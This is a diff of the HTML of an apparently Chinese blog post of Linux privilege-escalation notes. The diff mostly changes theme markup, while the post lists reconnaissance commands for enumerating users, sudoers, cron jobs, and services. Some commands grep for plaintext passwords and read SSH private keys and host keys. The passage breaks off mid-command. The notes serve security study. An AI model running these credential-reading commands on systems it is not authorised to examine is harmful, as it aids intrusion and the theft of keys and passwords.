@@ -5,10 +5,10 @@
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -16,8 +16,10 @@
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="有关linux提权的简要笔记">
 <meta property="og:type" content="article">
@@ -29,8 +31,8 @@
 <meta property="og:image" content="https://hasegawaazusa.github.io/linux-privilege-escalation-note/20200620164152-e392c15c-b2d1-1.png">
 <meta property="og:image" content="https://hasegawaazusa.github.io/linux-privilege-escalation-note/20200620164258-0afb894a-b2d2-1.png">
 <meta property="article:published_time" content="2022-04-12T05:50:43.000Z">
-<meta property="article:modified_time" content="2022-05-25T15:25:25.099Z">
-<meta property="article:author" content="qsDuzou">
+<meta property="article:modified_time" content="2023-03-16T06:34:35.135Z">
+<meta property="article:author" content="qsdz">
 <meta property="article:tag" content="note">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hasegawaazusa.github.io/linux-privilege-escalation-note/20200620164152-e392c15c-b2d1-1.png">
@@ -66,6 +68,9 @@
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
@@ -80,15 +85,46 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
 
 
 
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">104</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
 
 </header>
         
@@ -116,7 +152,9 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">qsDuzou</p>
+    <img class="site-author-image" itemprop="image" alt="qsdz"
+      src="/images/android-chrome-144x144.png">
+  <p class="site-author-name" itemprop="name">qsdz</p>
   <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
 </div>
 <div class="site-state-wrap animated">
@@ -134,6 +172,14 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
       </div>
   </nav>
 </div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
 
         </div>
       </div>
@@ -159,8 +205,8 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
     <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/linux-privilege-escalation-note.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="qsDuzou">
+      <meta itemprop="image" content="/images/android-chrome-144x144.png">
+      <meta itemprop="name" content="qsdz">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -192,7 +238,7 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-05-25 23:25:25" itemprop="dateModified" datetime="2022-05-25T23:25:25+08:00">2022-05-25</time>
+      <time title="修改时间：2023-03-16 14:34:35" itemprop="dateModified" datetime="2023-03-16T14:34:35+08:00">2023-03-16</time>
     </span>
 
   
@@ -237,26 +283,26 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
 </ul>
 <h1 id="信息收集">信息收集</h1>
 <h2 id="操作系统">操作系统</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uname -a    				<span class="comment"># 打印所有可用的系统信息</span></span><br><span class="line">uname -r    				<span class="comment"># 内核版本</span></span><br><span class="line">uname -n    				<span class="comment"># 系统主机名。</span></span><br><span class="line">uname -m    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">uname -mrs    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">hostname    				<span class="comment"># 系统主机名</span></span><br><span class="line">cat /proc/version    		<span class="comment"># 内核信息</span></span><br><span class="line">cat /etc/*-release   		<span class="comment"># 分发信息</span></span><br><span class="line">cat /etc/issue       		<span class="comment"># 分发信息</span></span><br><span class="line">cat /proc/cpuinfo    		<span class="comment"># CPU信息</span></span><br><span class="line">cat /etc/lsb-release		<span class="comment"># Debian based</span></span><br><span class="line">cat /etc/redhat-release		<span class="comment"># Redhat based</span></span><br><span class="line">ls /boot | grep vmlinuz-	<span class="comment"># 内核版本</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a    				<span class="comment"># 打印所有可用的系统信息</span></span><br><span class="line"><span class="built_in">uname</span> -r    				<span class="comment"># 内核版本</span></span><br><span class="line"><span class="built_in">uname</span> -n    				<span class="comment"># 系统主机名。</span></span><br><span class="line"><span class="built_in">uname</span> -m    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line"><span class="built_in">uname</span> -mrs    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">hostname    				<span class="comment"># 系统主机名</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version    		<span class="comment"># 内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release   		<span class="comment"># 分发信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue       		<span class="comment"># 分发信息</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo    		<span class="comment"># CPU信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/lsb-release		<span class="comment"># Debian based</span></span><br><span class="line"><span class="built_in">cat</span> /etc/redhat-release		<span class="comment"># Redhat based</span></span><br><span class="line"><span class="built_in">ls</span> /boot | grep vmlinuz-	<span class="comment"># 内核版本</span></span><br></pre></td></tr></table></figure>
 <h2 id="环境变量">环境变量</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">env        					<span class="comment"># 显示环境变量</span></span><br><span class="line"><span class="built_in">set</span>        					<span class="comment"># 现实环境变量</span></span><br><span class="line"><span class="built_in">echo</span> %PATH 					<span class="comment"># 路径信息</span></span><br><span class="line"><span class="built_in">history</span>    					<span class="comment"># 显示当前用户的历史命令记录</span></span><br><span class="line"><span class="built_in">pwd</span>        					<span class="comment"># 输出工作目录</span></span><br><span class="line">cat /etc/profile   			<span class="comment"># 显示默认系统变量</span></span><br><span class="line">cat /etc/shells    			<span class="comment"># 显示可用的shellrc</span></span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span>        					<span class="comment"># 显示环境变量</span></span><br><span class="line"><span class="built_in">set</span>        					<span class="comment"># 现实环境变量</span></span><br><span class="line"><span class="built_in">echo</span> %PATH 					<span class="comment"># 路径信息</span></span><br><span class="line"><span class="built_in">history</span>    					<span class="comment"># 显示当前用户的历史命令记录</span></span><br><span class="line"><span class="built_in">pwd</span>        					<span class="comment"># 输出工作目录</span></span><br><span class="line"><span class="built_in">cat</span> /etc/profile   			<span class="comment"># 显示默认系统变量</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shells    			<span class="comment"># 显示可用的shellrc</span></span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">cat</span> ~/.bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_logout</span><br></pre></td></tr></table></figure>
 <h2 id="打印机服务">打印机服务</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpstat -a</span><br></pre></td></tr></table></figure>
 <h2 id="用户和群组">用户和群组</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd     		<span class="comment"># 列出系统上的所有用户</span></span><br><span class="line">cat /var/mail/root</span><br><span class="line">cat /var/spool/mail/root</span><br><span class="line">cat /etc/group      		<span class="comment"># 列出系统上的所有组</span></span><br><span class="line">grep -v -E <span class="string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>      <span class="comment"># 列出所有的超级用户账户</span></span><br><span class="line">whoami              		<span class="comment"># 查看当前用户</span></span><br><span class="line">w                   		<span class="comment"># 谁目前已登录，他们正在做什么</span></span><br><span class="line">last                		<span class="comment"># 最后登录用户的列表</span></span><br><span class="line">lastlog             		<span class="comment"># 所有用户上次登录的信息</span></span><br><span class="line">lastlog –u %username%  		<span class="comment"># 有关指定用户上次登录的信息</span></span><br><span class="line">lastlog |grep -v <span class="string">&quot;Never&quot;</span>  	<span class="comment"># 以前登录用户的完整信息</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd     		<span class="comment"># 列出系统上的所有用户</span></span><br><span class="line"><span class="built_in">cat</span> /var/mail/root</span><br><span class="line"><span class="built_in">cat</span> /var/spool/mail/root</span><br><span class="line"><span class="built_in">cat</span> /etc/group      		<span class="comment"># 列出系统上的所有组</span></span><br><span class="line">grep -v -E <span class="string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>      <span class="comment"># 列出所有的超级用户账户</span></span><br><span class="line"><span class="built_in">whoami</span>              		<span class="comment"># 查看当前用户</span></span><br><span class="line">w                   		<span class="comment"># 谁目前已登录，他们正在做什么</span></span><br><span class="line">last                		<span class="comment"># 最后登录用户的列表</span></span><br><span class="line">lastlog             		<span class="comment"># 所有用户上次登录的信息</span></span><br><span class="line">lastlog –u %username%  		<span class="comment"># 有关指定用户上次登录的信息</span></span><br><span class="line">lastlog |grep -v <span class="string">&quot;Never&quot;</span>  	<span class="comment"># 以前登录用户的完整信息</span></span><br></pre></td></tr></table></figure>
 <h2 id="用户权限信息">用户权限信息</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami        当前用户名</span><br><span class="line">id            当前用户信息</span><br><span class="line">cat /etc/sudoers  谁被允许以root身份执行</span><br><span class="line">sudo -l       当前用户可以以root身份执行操作</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>        当前用户名</span><br><span class="line"><span class="built_in">id</span>            当前用户信息</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers  谁被允许以root身份执行</span><br><span class="line">sudo -l       当前用户可以以root身份执行操作</span><br></pre></td></tr></table></figure>
 <h2 id="进程和服务">进程和服务</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line"><span class="built_in">cat</span> /etc/services</span><br></pre></td></tr></table></figure>
 <p>查看以 root 运行的进程</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>
 <h2 id="查看安装的软件">查看安装的软件</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line">dpkg -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /usr/bin/</span><br><span class="line"><span class="built_in">ls</span> -alh /sbin/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/cache/yum/</span><br><span class="line">dpkg -l</span><br></pre></td></tr></table></figure>
 <h2 id="服务插件">服务/插件</h2>
 <p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk <span class="string">&#x27;$1 ~ /^.*r.*/</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/syslog.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/chttp.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/lighttpd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/cups/cupsd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/apache2/apache2.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/my.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/conf/httpd.conf</span><br><span class="line"><span class="built_in">cat</span> /opt/lampp/etc/httpd.conf</span><br><span class="line"><span class="built_in">ls</span> -aRl /etc/ | awk <span class="string">&#x27;$1 ~ /^.*r.*/</span></span><br></pre></td></tr></table></figure>
 <h2 id="计划任务">计划任务</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"><span class="built_in">ls</span> -alh /var/spool/cron</span><br><span class="line"><span class="built_in">ls</span> -al /etc/ | grep cron</span><br><span class="line"><span class="built_in">ls</span> -al /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/at.allow</span><br><span class="line"><span class="built_in">cat</span> /etc/at.deny</span><br><span class="line"><span class="built_in">cat</span> /etc/cron.allow</span><br><span class="line"><span class="built_in">cat</span> /etc/cron.deny</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">cat</span> /etc/anacrontab</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
 <h2 id="有无明文存放用户密码">有无明文存放用户密码</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> [filename]</span><br><span class="line">find , -name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="string">&quot;var <span class="variable">$password</span>&quot;</span></span><br></pre></td></tr></table></figure>
 <blockquote>
@@ -264,15 +310,15 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
 <p>又或者说 MySQL 中明文存放用户密码。</p>
 </blockquote>
 <h2 id="有无-ssh-私钥">有无 ssh 私钥</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/identity.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/identity</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_dsa.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_dsa</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_dsa_key</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
 <h2 id="查看与当前机器通信的其他用户或者主机">查看与当前机器通信的其他用户或者主机</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
 <h2 id="日志文件">日志文件</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/boot.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/cron</span><br><span class="line">cat /var/<span class="built_in">log</span>/syslog</span><br><span class="line">cat /var/<span class="built_in">log</span>/wtmp</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat 